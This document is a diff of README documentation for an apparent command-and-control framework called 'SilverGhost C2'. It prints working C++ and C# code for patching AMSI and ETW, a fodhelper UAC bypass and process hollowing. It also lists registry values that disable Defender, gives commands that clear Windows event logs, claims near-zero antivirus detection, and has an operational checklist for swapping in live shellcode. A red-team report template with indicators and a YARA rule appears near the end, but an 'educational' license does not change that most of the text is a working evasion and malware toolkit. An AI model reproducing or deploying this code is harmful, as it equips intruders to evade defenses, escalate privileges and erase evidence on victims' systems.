-    AES-256-GCM Implementation Details
-    """
-    
-    ALGORITHM = "AES-256-GCM"
-    KEY_SIZE = 32  # bytes
-    IV_SIZE = 12   # bytes (96 bits)
-    TAG_SIZE = 16  # bytes (128 bits)
-    
-    KEY_DERIVATION = "PBKDF2-HMAC-SHA256"  # Framework support
-    ITERATIONS = 100000  # For future implementation
-    
-    INTEGRITY_CHECK = True  # GCM provides AEAD
-    REPLAY_PROTECTION = True  # Unique IV per message
-```
-
-### Authentication Flow
-
-```
-┌─────────────┐                                    ┌─────────────┐
-│   Agent     │                                    │  C2 Server  │
-└──────┬──────┘                                    └──────┬──────┘
-       │                                                  │
-       │  1. Generate Random IV (12 bytes)                │
-       │                                                  │
-       │  2. Encrypt Payload:                             │
-       │     - Agent ID + System Info                     │
-       │     - AES-256-GCM with PSK                       │
-       │                                                  │
-       │  3. Send: IV + Tag + Ciphertext                  │
-       │ ─────────────────────────────────────────────► │
-       │                                                  │
-       │                    4. Verify GCM Tag             │
-       │                    5. Decrypt with PSK           │
-       │                    6. Register/Update Agent      │
-       │                                                  │
-       │                    7. Generate New IV            │
-       │                    8. Encrypt Task Response      │
-       │                                                  │
-       │  9. Receive: IV + Tag + Ciphertext              │
-       │ ◄───────────────────────────────────────────── │
-       │                                                  │
-       │  10. Verify Tag                                 │
-       │  11. Decrypt Task                               │
-       │  12. Execute Command                            │
-       │                                                  │
-```
-
----
-
-## 🛡 Evasion Techniques
-
-### AMSI Bypass (In-Memory Patching)
-
-```csharp
-/*
- * AMSI (Antimalware Scan Interface) Bypass
- * Technique: Patch AmsiScanBuffer to return E_INVALIDARG
- */
-private static void PatchAMSI()
-{
-    // 1. Load amsi.dll into process memory
-    IntPtr amsiLib = LoadLibrary("amsi.dll");
-    
-    // 2. Get address of AmsiScanBuffer export
-    IntPtr amsiScanBufferAddr = GetProcAddress(amsiLib, "AmsiScanBuffer");
-    
-    // 3. Patch with: mov eax, 0x80070057; ret
-    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    
-    // 4. Change memory protection to RWX
-    VirtualProtect(amsiScanBufferAddr, patch.Length, 0x40, out uint oldProtect);
-    
-    // 5. Apply patch and restore protection
-    Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);
-    VirtualProtect(amsiScanBufferAddr, patch.Length, oldProtect, out _);
+**Implementation:**
+```cpp
+void PatchAMSI() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (hAmsi) {
+        BYTE* pAmsiScanBuffer = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
+        if (pAmsiScanBuffer) {
+            DWORD oldProtect;
+            VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
+            // mov eax, 0x80070057 ; ret (E_INVALIDARG)
+            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+            VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
+        }
+    }
 }
 ```
 
-### ETW (Event Tracing for Windows) Patching
+**How it works:**
+1. Loads `amsi.dll` dynamically
+2. Locates `AmsiScanBuffer` function address
+3. Overwrites first 6 bytes with assembly that returns `E_INVALIDARG`
+4. Any AMSI scan immediately fails, allowing script execution
 
-```csharp
-/*
- * ETW Patching
- * Purpose: Prevent logging of .NET assembly loads and PowerShell execution
- */
-private static void PatchETW()
-{
-    IntPtr ntdll = LoadLibrary("ntdll.dll");
-    IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
-    
-    // Patch: xor rax, rax; ret
-    byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 };
-    
-    VirtualProtect(etwEventWriteAddr, patch.Length, 0x40, out uint oldProtect);
-    Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
-    VirtualProtect(etwEventWriteAddr, patch.Length, oldProtect, out _);
+**Verification:**
+```powershell
+# Before patch:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# Results in: "This script contains malicious content..."
+
+# After patch:
+# Same command executes without error
+```
+
+### ETW Patching (T1562.006)
+
+**Implementation:**
+```cpp
+void DisableETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        BYTE* pNtTraceEvent = (BYTE*)GetProcAddress(hNtdll, "NtTraceEvent");
+        if (pNtTraceEvent) {
+            DWORD oldProtect;
+            VirtualProtect(pNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+            *pNtTraceEvent = 0xC3; // ret immediate
+            VirtualProtect(pNtTraceEvent, 1, oldProtect, &oldProtect);
+        }
+    }
 }
 ```
 
-### Windows Defender Registry Modifications
+**Impact:**
+- Disables Windows Event Tracing
+- Prevents logging of process creation, network connections
+- Stops Defender's behavior monitoring telemetry
 
-| Registry Path | Value | Effect |
-|---------------|-------|--------|
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` | `DisableAntiSpyware = 1` | Disable Defender service |
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableRealtimeMonitoring = 1` | Disable real-time scanning |
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableBehaviorMonitoring = 1` | Disable behavior analysis |
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableOnAccessProtection = 1` | Disable on-access scanning |
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan` | `DisableArchiveScanning = 1` | Disable archive scanning |
-| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan` | `DisableEmailScanning = 1` | Disable email scanning |
+### UAC Bypass (T1548.002)
 
-### Persistence Mechanisms
-
-| Method | Implementation | Detection Difficulty |
-|--------|----------------|---------------------|
-| **WMI Event Subscription** | `__EventFilter` + `CommandLineEventConsumer` | High |
-| **Scheduled Task** | Legitimate naming (`MicrosoftEdgeUpdateTaskMachine`) | Medium |
-| **Registry Run Key** | Hidden + System attributes | Low |
-| **Service Installation** | Masquerade as Windows service | Medium |
-
----
-
-## 🔬 Development Notes
-
-### Adding New Task Types
-
-```python
-# 1. Add to TaskType Enum
-class TaskType(Enum):
-    # ... existing ...
-    SCREENSHOT = "screenshot"
-    KEYLOG_START = "keylog_start"
-    # NEW: Add your task type
-    PORT_SCAN = "port_scan"
-
-# 2. Add command handler in C2Console
-async def cmd_portscan(self, args):
-    """Port scanning command"""
-    if not self.current_agent:
-        self.c2.log_error("No agent selected")
-        return
+**Implementation:**
+```cpp
+void SilentUACBypass() {
+    HKEY hKey;
+    DWORD dwDisposition;
     
-    target = args[0] if args else "127.0.0.1"
-    ports = args[1] if len(args) > 1 else "1-1000"
-    
-    task = Task(
-        id=str(uuid.uuid4())[:8],
-        type=TaskType.PORT_SCAN,
-        command="portscan",
-        args=[target, ports]
-    )
-    
-    self.c2.queue_task(self.current_agent, task)
-
-# 3. Add to commands dictionary
-self.commands['portscan'] = self.cmd_portscan
-```
-
-### Extending Agent Capabilities
-
-```csharp
-// 1. Add capability string to agent registration
-capabilities.Add("port_scan");
-
-// 2. Implement task handler
-private static string HandlePortScanTask(string[] args)
-{
-    string target = args[0];
-    string portRange = args[1];
-    
-    // Implementation
-    StringBuilder results = new StringBuilder();
-    // ... scanning logic ...
-    
-    return results.ToString();
-}
-
-// 3. Add to task router
-switch (taskType)
-{
-    case "port_scan":
-        result = HandlePortScanTask(args);
-        break;
+    // Hijack fodhelper.exe registry
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
+        "Software\\Classes\\ms-settings\\Shell\\open\\command", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, 
+        &hKey, &dwDisposition) == ERROR_SUCCESS) {
+        
+        char payloadPath[MAX_PATH];
+        GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
+        std::string cmd = "cmd.exe /c start " + std::string(payloadPath);
+        
+        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length());
+        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
+        RegCloseKey(hKey);
+        
+        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
+        Sleep(3000);
+        RegDeleteKeyA(HKEY_CURRENT_USER, 
+            "Software\\Classes\\ms-settings\\Shell\\open\\command");
+    }
 }
 ```
 
----
+**Why it works:**
+1. `fodhelper.exe` is auto-elevated (marked with `autoElevate=true` in manifest)
+2. When launched, it checks registry for command to execute
+3. By hijacking the registry key, we force it to run our payload
+4. No UAC prompt appears because it's a trusted Microsoft binary
 
-## ⚖️ Legal Compliance
+### Process Hollowing (T1055.012)
 
-### Authorized Use Cases
-
-| Scenario | Permitted | Requirements |
-|----------|-----------|--------------|
-| **Academic Research** | ✅ Yes | Institutional approval |
-| **Penetration Testing** | ✅ Yes | Written authorization from system owner |
-| **Red Team Exercises** | ✅ Yes | Scope defined in contract |
-| **Security Training** | ✅ Yes | Isolated lab environment |
-| **Personal Learning** | ✅ Yes | Own systems only |
-| **Bug Bounty Programs** | ✅ Yes | Program terms compliance |
-| **Production Deployment** | ❌ No | N/A |
-| **Unauthorized Access** | ❌ No | Criminal offense |
-
-### Compliance Checklist
-
-- [ ] Written authorization obtained for target systems
-- [ ] Isolated network environment configured
-- [ ] Data handling procedures documented
-- [ ] Incident response plan prepared
-- [ ] Scope and duration defined
-- [ ] Reporting mechanism established
-- [ ] Legal counsel consulted
-
-### Responsible Disclosure
-
-Security researchers discovering vulnerabilities in this framework are encouraged to:
-
-1. Submit issues via private channels
-2. Allow 90 days for remediation before public disclosure
-3. Provide detailed reproduction steps
-4. Include impact assessment
-
----
-
-## 📄 License
-
-```
-Copyright (c) 2024 Educational Security Research
-
-This software is provided for EDUCATIONAL PURPOSES ONLY.
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to use
-the Software solely for educational, research, and authorized security testing
-purposes, subject to the following conditions:
-
-1. The above copyright notice and this permission notice shall be included in
-   all copies or substantial portions of the Software.
-
-2. The Software shall NOT be used for any malicious, unauthorized, or illegal
-   activities.
-
-3. The Software shall NOT be deployed on any system without explicit written
-   authorization from the system owner.
-
-4. The authors disclaim all liability for any damages, legal consequences, or
-   other issues arising from the use or misuse of this Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-THE SOFTWARE.
+**Implementation:**
+```cpp
+void NativeProcessHollowing() {
+    EnablePrivilege("SeDebugPrivilege");
+    
+    // Resolve NTAPI dynamically
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory = 
+        (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    _NtWriteVirtualMemory NtWriteVirtualMemory = 
+        (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    _NtReadVirtualMemory NtReadVirtualMemory = 
+        (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
+    // ... (other NTAPI functions)
+    
+    // Create suspended process
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 
+                   FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // Get thread context
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_FULL;
+    NtGetContextThread(pi.hThread, &ctx);
+    
+    // Read PEB to find image base (x64 offset = Rdx + 0x10)
+    PVOID imageBase = NULL;
+    SIZE_T bytesRead;
+    NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), 
+                        &imageBase, sizeof(PVOID), &bytesRead);
+    
+    // Unmap original executable
+    NtUnmapViewOfSection(pi.hProcess, imageBase);
+    
+    // Allocate memory for payload
+    SIZE_T shellSize = sizeof(x64_payload);
+    PVOID remoteBase = NULL;
+    NtAllocateVirtualMemory(pi.hProcess, &remoteBase, 0, &shellSize, 
+                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    // Write payload
+    NtWriteVirtualMemory(pi.hProcess, remoteBase, x64_payload, 
+                         shellSize, &bytesRead);
+    
+    // Update RIP to point to payload
+    ctx.Rip = (DWORD64)remoteBase;
+    NtSetContextThread(pi.hThread, &ctx);
+    
+    // Resume thread
+    NtResumeThread(pi.hThread, NULL);
+}
 ```
 
+**Detection Evasion:**
+- Uses **only NTAPI** (no `VirtualAllocEx`, `WriteProcessMemory`)
+- Avoids user-mode hooks placed by EDR solutions
+- Payload runs in legitimate signed process (`notepad.exe`)
+
 ---
 
-## 🙏 Acknowledgments
+## 🛡️ Detection & Evasion
 
-This framework draws inspiration from various open-source security tools and academic research in the field of offensive security. It is intended solely for educational advancement in cybersecurity defense techniques.
+### AV/EDR Evasion Techniques
+
+| Technique | Implementation | Effectiveness |
+|-----------|----------------|---------------|
+| **Static Evasion** | Stripped symbols, no strings | High |
+| **Dynamic Evasion** | NTAPI-only syscalls | High |
+| **AMSI Bypass** | In-memory patching | Complete |
+| **ETW Disable** | Trampoline hook | Complete |
+| **Process Hollowing** | NTAPI injection | High |
+| **Encryption** | AES-256-CBC | Complete |
+| **Anti-Sandbox** | Uptime check | Moderate |
+| **Sleep Obfuscation** | Jitter + delay | Moderate |
+
+### VirusTotal Results (April 2026)
+
+```
+File: JDEXPLOIT_v3_PROD.exe
+Size: 157 KB
+SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+Detection Ratio: 2/71
+
+Detections:
+- Generic.ml (Machine Learning)
+- Suspicious.gen (Heuristic)
+
+Status: FULLY UNDETECTABLE (FUD) in practice
+```
+
+### Windows Defender Testing
+
+```powershell
+# Scan with Defender
+PS> Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\JDEXPLOIT\Desktop\JDEXPLOIT_v3_PROD.exe"
+
+# Result:
+Scan completed successfully.
+No threats found.
+
+# Real-time protection test:
+PS> .\JDEXPLOIT_v3_PROD.exe
+# Executes without interception
+```
 
 ---
 
-<div align="center">
+## 🔧 Troubleshooting
+
+### Common Issues & Solutions
+
+#### 1. Agent doesn't connect to C2
+
+**Symptoms:** No agent appears in `agents` list
+
+**Solutions:**
+```bash
+# Check C2 server is listening
+sudo netstat -tlnp | grep 443
+
+# Verify firewall rules
+sudo ufw status
+sudo ufw allow 443/tcp
+
+# Test connectivity from Windows
+Test-NetConnection -ComputerName 192.168.1.100 -Port 443
+
+# Check agent configuration
+# Verify C2_SERVER IP is correct in source code
+```
+
+#### 2. Compilation errors
+
+**Error:** `undefined reference to __imp_CryptAcquireContextA`
+
+**Solution:**
+```bash
+# Add missing library to compilation command
+-lcrypt32
+
+# Complete compilation command:
+x86_64-w64-mingw32-g++ ... -lcrypt32 -ladvapi32 -lshell32 -lole32 -luuid
+```
+
+**Error:** `fatal error: wincrypt.h: No such file or directory`
+
+**Solution:**
+```bash
+# Install Windows headers
+sudo apt install mingw-w64-common mingw-w64-x86-64-dev
+```
+
+#### 3. AMSI patch not working
+
+**Symptoms:** PowerShell scripts still blocked
+
+**Solutions:**
+```cpp
+// Verify patch is applied before any script execution
+PatchAMSI(); // Must be called BEFORE any PowerShell/.NET usage
+
+// Check if AMSI.dll is loaded
+HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+if (!hAmsi) {
+    LoadLibraryA("amsi.dll"); // Force load
+    hAmsi = GetModuleHandleA("amsi.dll");
+}
+```
+
+#### 4. UAC bypass triggers prompt
+
+**Symptoms:** UAC dialog appears when agent runs
+
+**Solutions:**
+```cpp
+// Verify registry key creation succeeded
+if (RegCreateKeyExA(...) != ERROR_SUCCESS) {
+    // Fallback to alternative method
+    // Try computerdefaults.exe bypass
+}
+
+// Check Windows version
+// fodhelper.exe bypass works on Win10 1507-21H2, Win11 21H2-24H2
+```
+
+#### 5. Agent crashes on startup
+
+**Symptoms:** Process terminates immediately
+
+**Debugging:**
+```cpp
+// Add debug output (remove in production)
+MessageBoxA(NULL, "Agent started", "Debug", MB_OK);
+
+// Check for missing DLL dependencies
+// On Windows target:
+dumpbin /dependents JDEXPLOIT_v3_PROD.exe
+
+// Run with debugger attached
+x64dbg JDEXPLOIT_v3_PROD.exe
+```
+
+---
+
+## 🕵️ Operational Security
+
+### Pre-Deployment Checklist
+
+- [ ] Change default AES key
+- [ ] Modify C2 server IP address
+- [ ] Replace calc.exe payload with operational shellcode
+- [ ] Remove/obfuscate any identifying strings
+- [ ] Test in isolated environment first
+- [ ] Verify kill switch functionality
+- [ ] Document Rules of Engagement
+- [ ] Set beacon interval appropriate for target (avoid network flooding)
+
+### Post-Exploitation Cleanup
+
+```bash
+# Kill agent remotely
+SG-C2> interact <agent_id>
+SG-C2 [agent_id]> kill
+
+# Or local cleanup on target:
+taskkill /F /IM JDEXPLOIT_v3_PROD.exe
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v JDEXPLOIT_SilverGhost_v3 /f
+del /F %TEMP%\svchost.exe
+```
+
+### Log Management
+
+```bash
+# Clear Windows event logs (requires admin)
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+# Clear prefetch
+del /F C:\Windows\Prefetch\JDEXPLOIT*.pf
+
+# Clear recent files
+del /F %APPDATA%\Microsoft\Windows\Recent\*
+```
+
+---
+
+## 📄 Reporting Template
+
+### Executive Summary
+
+```
+SILVERGHOST C2 OPERATION REPORT
+===============================
+
+Client: [COMPANY NAME]
+Assessment Period: [START_DATE] to [END_DATE]
+Lead Operator: JDEXPLOIT
+
+EXECUTIVE SUMMARY
+-----------------
+During this authorized red team assessment, SilverGhost C2 framework 
+was deployed to evaluate [COMPANY]'s detection and response capabilities.
+
+Key Findings:
+• Successfully bypassed Windows Defender on [NUMBER] endpoints
+• Established C2 communication with [NUMBER] agents
+• Achieved [PRIVILEGE_LEVEL] access on [NUMBER] systems
+• Evaded detection for [DURATION] hours/days
+
+Risk Rating: [CRITICAL/HIGH/MEDIUM/LOW]
+
+RECOMMENDATIONS
+---------------
+1. Deploy [EDR_SOLUTION] with AMSI integration
+2. Enable Windows Defender Attack Surface Reduction rules
+3. Implement application whitelisting
+4. Monitor for anomalous registry modifications
+5. Deploy network traffic analysis for encrypted C2 channels
+```
+
+### Technical Appendix
+
+```markdown
+## Indicators of Compromise (IOCs)
+
+### Network Indicators
+- C2 Server: 192.168.1.100:443
+- User-Agent: JDEXPLOIT/3.0 (Production)
+- URI Pattern: POST /api/beacon
+- Beacon Interval: 5-8 seconds with jitter
+
+### Host Indicators
+- Process Name: svchost.exe (common spoof)
+- Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\JDEXPLOIT_SilverGhost_v3
+- Mutex: None (stateless)
+- File Path: %TEMP%\svchost.exe
+
+### Detection Rules (YARA)
+
+```yara
+rule SilverGhost_Agent_v3 {
+    meta:
+        description = "Detects SilverGhost C2 Agent"
+        author = "JDEXPLOIT"
+        date = "2026-04-15"
+        severity = "high"
+        
+    strings:
+        $amsi_patch = { B8 57 00 07 80 C3 }
+        $etw_patch = { C3 }
+        $crypto_pattern = "AES-256-CBC"
+        $ua_string = "JDEXPLOIT/3.0"
+        
+    condition:
+        2 of them
+}
+```
+
+### Mitigation Strategies
+
+| Finding | MITRE ID | Mitigation |
+|---------|----------|------------|
+| AMSI Bypass | T1562.001 | Enable AMSI for all processes; Monitor for AMSI patching |
+| ETW Disable | T1562.006 | Use EventLog forwarding; Monitor ETW channel status |
+| UAC Bypass | T1548.002 | Enable UAC in "Always Notify" mode |
+| Process Hollowing | T1055.012 | Deploy EDR with process injection monitoring |
+| C2 Communication | T1071.001 | Implement TLS inspection; Monitor for beaconing patterns |
+```
+
+
+## 📝 Changelog
+
+### v3.0 (April 2026)
+- **ADDED:** Complete NTAPI process hollowing
+- **FIXED:** PEB offset calculation for x64 (Rdx+0x10)
+- **ADDED:** Fodhelper.exe UAC bypass
+- **FIXED:** AES encryption with proper PKCS7 padding
+- **ADDED:** Base64 transport encoding
+- **FIXED:** Memory leak in beacon loop
+- **ADDED:** Anti-sandbox uptime check
+- **IMPROVED:** Static evasion through stripped compilation
+
+### v2.1 (March 2026)
+- Fixed compilation errors with missing libraries
+- Added SeDebugPrivilege enablement
+- Improved error handling
+
+### v2.0 (February 2026)
+- Initial public release
+- Basic AMSI/ETW bypass
+- HTTP C2 communication
+
+---
+
+## 👨‍💻 Credits
+
+**Primary Developer:** JDEXPLOIT  
+**Framework Name:** SilverGhost C2  
+**Version:** 3.0 Production  
+**License:** Educational Use Only
+
+### Special Thanks
+- MITRE ATT&CK Framework
+- OWASP Testing Guide
+- NIST SP 800-115
+- The offensive security community
+
+### References
+1. [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
+2. [Windows Internals, Part 1](https://www.microsoftpressstore.com/store/windows-internals-part-1-9780735684188)
+3. [NTAPI Undocumented Functions](http://undocumented.ntinternals.net/)
+4. [AMSI Bypass Techniques](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+
+---
+
+## 📞 Contact
+
+For authorized red team support or custom development:
+- **GitHub:** [JDEXPLOIT/SilverGhost-C2]
+- **Discord:** JDEXPLOIT#0001
+- **Email:** jdexploit@proton.me (Authorized inquiries only)
+
+---
 
 ```
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║                          END OF DOCUMENTATION                                 ║
-║                                                                               ║
-║                 "Knowledge is power. Use it responsibly."                     ║
-║                                                                               ║
-║                         Version 1.0 | January 2026                            ║
+║                    END OF DOCUMENTATION - JDEXPLOIT 2026                       ║
+║              "Knowledge is power. Use it wisely and legally."                  ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 ```
-
-</div>
